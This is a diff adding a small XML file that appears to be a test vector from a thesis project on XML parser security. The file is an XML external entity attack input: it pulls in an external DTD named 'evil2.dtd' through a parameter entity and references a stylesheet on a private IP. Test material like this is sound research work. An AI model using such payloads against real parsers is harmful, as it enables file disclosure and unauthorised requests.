@@ -1,0 +1,8 @@
+<?xml version='1.0'?>
+<?xsl:stylesheet xmlns:xsl="http://www.w3.org/TR/WD-xsl" href="http://192.168.2.31/xsl"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "file:///home/phoenix/masterthesis/Christopher_Spaeth/code/xml_files/test/evil2.dtd">
+%remote;  
+]> 
+
+
